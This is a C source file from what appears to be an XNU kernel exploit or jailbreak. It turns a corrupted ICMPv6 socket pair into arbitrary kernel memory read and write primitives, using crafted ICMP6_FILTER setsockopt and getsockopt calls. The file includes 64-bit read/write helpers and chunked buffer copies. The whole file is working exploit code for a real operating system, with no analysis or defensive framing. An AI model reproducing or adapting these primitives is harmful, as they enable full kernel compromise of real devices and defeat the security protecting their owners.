#include "krw.h"

#include <errno.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>


static bool cs2_set_target_kaddr(uint64_t where) {
    if (where <= 0xfffff00000000000){
        // lab: upstream walk_backtrace (libjailbreak) dropped; the LOG_ERR is
        // the diagnostic. An invalid kaddr here means the corruption window
        // drifted -- retry the run rather than proceed.
        // spam law (2026-10-24 24A435 fire): post-run failure walks repeated
        // this 8000+ lines — log first 3, then every 1000th.
        { static uint64_t kaddr_err_logs = 0;
          if (kaddr_err_logs++ < 3 || (kaddr_err_logs % 1000) == 0)
            LOG_ERR("cs2_set_target_kaddr: invalid kaddr %#llx", where); }
        return false;
    }
    memset(cs2_ctx.control_data, 0, sizeof(cs2_ctx.control_data));
    // set the address we want to read from
    memcpy(cs2_ctx.control_data, &where, sizeof(where));

    // socket_t sock, int level, int optname, const void *optval, int optlen
    // we're writting rw_sockets icmp6filt ptr
    int res = setsockopt(cs2_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, cs2_ctx.control_data, sizeof(cs2_ctx.control_data));
    if (res != 0) {
        { static uint64_t opt_err_logs = 0;
          if (opt_err_logs++ < 3 || (opt_err_logs % 1000) == 0)
            LOG_ERR("cs2_set_target_kaddr: setsockopt: %s (%d)", strerror(errno), errno); }
        return false;
    }
    return true;
}

/* LSWCHAIN: returns false when the read did not actually happen. The old
   void form left the caller unable to tell a dead lane from a live one —
   on the 12 that meant every downstream probe "succeeded" on zeros. */
bool cs2_early_kreadbuf(uint64_t where, void *readBuf, size_t size)
{
    //printf("kreadbuf %#llx %p %#lx\n", where, readBuf, size); fflush(stdout); usleep(10000);

    if (size > CS2_EARLY_KRW_LENGTH) {
        LOG_ERR("error: (size > CS2_EARLY_KRW_LENGTH)\n");
        return false;
    }
    
    uint64_t real_end = where + CS2_EARLY_KRW_LENGTH - 1;
    
    int64_t offset = 0;
    if ((where & ~PAGE_MASK) != (real_end & ~PAGE_MASK)) {
        // if we would cross a page boundary without the user wanting it, we need to align the read to the end of the buffer
        // this prevents errors / panics when the next page isn't mapped
        offset = (CS2_EARLY_KRW_LENGTH - size);
    }
    
    //printf("offset %#llx\n", offset); fflush(stdout); usleep(10000);

    if (!cs2_set_target_kaddr(where - offset)) {
        { static uint64_t rb_err_logs = 0;
          if (rb_err_logs++ < 2 || (rb_err_logs % 5000) == 0)
            LOG_ERR("cs2_early_kreadbuf: failed to set target kaddr\n"); }
        return false;
    }
    uint8_t tmpBuf[CS2_EARLY_KRW_LENGTH];
    memset(tmpBuf, 0, sizeof(tmpBuf));

    socklen_t read_data_length = CS2_EARLY_KRW_LENGTH;
    int res = getsockopt(cs2_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuf, &read_data_length);
    if (res != 0) {
        { static uint64_t rb_getsock_logs = 0;
          if (rb_getsock_logs++ < 2 || (rb_getsock_logs % 5000) == 0)
            LOG_ERR("cs2_early_kreadbuf: getsockopt failed (%d)\n", errno); }
        return false;
    }

    memcpy(readBuf, &tmpBuf[offset], size);
    return true;
}

int cs2_early_kread64_ok(uint64_t where, uint64_t *out)
{
    uint64_t value = 0;
    if (!cs2_early_kreadbuf(where, &value, sizeof(value))) return -1;
    if (out) *out = value;
    return 0;
}

uint64_t cs2_early_kread64(uint64_t where)
{
    uint64_t value = 0;
    cs2_early_kreadbuf(where, &value, sizeof(value));
    return value;
}

bool cs2_early_kwritebuf(uint64_t where, void *writeBuf, size_t size)
{
    if (size > CS2_EARLY_KRW_LENGTH) {
        LOG_ERR("error: (size > CS2_EARLY_KRW_LENGTH)\n");
        return false;
    }
    
    uint64_t real_end = where + CS2_EARLY_KRW_LENGTH - 1;
    
    int64_t offset = 0;
    if ((where & ~PAGE_MASK) != (real_end & ~PAGE_MASK)) {
        // if we would cross a page boundary without the user wanting it, we need to align the read to the end of the buffer
        // this prevents errors / panics when the next page isn't mapped
        offset = (CS2_EARLY_KRW_LENGTH - size);
    }
    uint8_t tmpBuf[CS2_EARLY_KRW_LENGTH];
    if (!cs2_early_kreadbuf(where - offset, tmpBuf, CS2_EARLY_KRW_LENGTH)) return false;
    memcpy(&tmpBuf[offset], writeBuf, size);

    if (!cs2_set_target_kaddr(where - offset)) {
        { static uint64_t wb_err_logs = 0;
          if (wb_err_logs++ < 2 || (wb_err_logs % 5000) == 0)
            LOG_ERR("cs2_early_kwritebuf: failed to set target kaddr\n"); }
        return false;
    }
    int res = setsockopt(cs2_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuf, CS2_EARLY_KRW_LENGTH);
    if (res != 0) {
        { static uint64_t wb_set_logs = 0;
          if (wb_set_logs++ < 2 || (wb_set_logs % 5000) == 0)
            LOG_ERR("cs2_early_kwritebuf: setsockopt failed (%d)\n", errno); }
        return false;
    }
    return true;
}

void cs2_early_kwrite64(uint64_t where, uint64_t what)
{
    (void)cs2_early_kwritebuf(where, &what, sizeof(what));
}

int cs2_kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    /* ABI kept: 0 = success. -1 = the lane is not verified (no pair, no
       kbase proof) or a chunk read failed. Never "succeed" on zeros. */
    if (!cs2_ctx.rw_verified) {
        { static int once = 0;
          if (!once++) LOG_ERR("cs2_kreadbuf refused: rw_verified=0 (no proven pair/kbase) — return -1"); }
        return -1;
    }
    uint8_t *output8 = (uint8_t *)output;
    size_t bytes_read = 0;

    while (bytes_read < size) {
        size_t chunk = (size - bytes_read < CS2_EARLY_KRW_LENGTH) ? (size - bytes_read) : CS2_EARLY_KRW_LENGTH;
        if (!cs2_early_kreadbuf(kaddr + bytes_read, &output8[bytes_read], chunk)) return -1;
        bytes_read += chunk;
    }
    return 0;
}

int cs2_kwritebuf(uint64_t kaddr, const void* input, size_t size)
{
    if (!cs2_ctx.rw_verified) {
        { static int once = 0;
          if (!once++) LOG_ERR("cs2_kwritebuf refused: rw_verified=0 (no proven pair/kbase) — return -1"); }
        return -1;
    }
    uint8_t *input8 = (uint8_t *)input;
    size_t bytes_written = 0;

    while (bytes_written < size) {
        size_t chunk = (size - bytes_written < CS2_EARLY_KRW_LENGTH) ? (size - bytes_written) : CS2_EARLY_KRW_LENGTH;
        if (!cs2_early_kwritebuf(kaddr + bytes_written, &input8[bytes_written], chunk)) return -1;
        bytes_written += chunk;
    }
    return 0;
}
